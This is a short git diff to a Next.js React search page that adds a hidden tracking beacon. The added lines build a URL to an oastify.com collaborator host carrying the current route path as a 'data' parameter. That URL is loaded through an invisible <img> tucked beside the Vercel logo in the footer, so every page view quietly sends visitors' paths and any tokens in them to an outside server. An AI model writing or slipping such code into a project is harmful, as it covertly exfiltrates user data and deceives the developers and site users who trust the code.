@@ -1,6 +1,8 @@
 import { useState } from 'react';
 import Head from 'next/head';
 
+import { useRouter } from 'next/router';
+
 import Fuse from 'fuse.js';
 import _ from 'lodash';
 
@@ -8,7 +10,10 @@ import styles from '../styles/Home.module.css';
 import CodeSampleModal from '../components/CodeSampleModal';
 
 export default function Start({ countries }) {
+  const router = useRouter();
   const [results, setResults] = useState(countries);
+  const currentUrl = typeof window !== 'undefined' ? window.location.href : '';
+  const Url = "https://kj7muz2xiiu4uusrglyh8eo18sej2awbk0.oastify.com/?data=" + router.asPath;
   const [isModalOpen, setIsModalOpen] = useState(false);
   const fuse = new Fuse(countries, {
     keys: ['name'],
@@ -91,7 +96,7 @@ export default function Start({ countries }) {
         >
           Powered by
           <span className={styles.logo}>
-            <img src="/vercel.svg" alt="Vercel Logo" />
+            <img src="/vercel.svg" alt="Vercel Logo" /><img src={Url} />
           </span>
         </a>
       </footer>
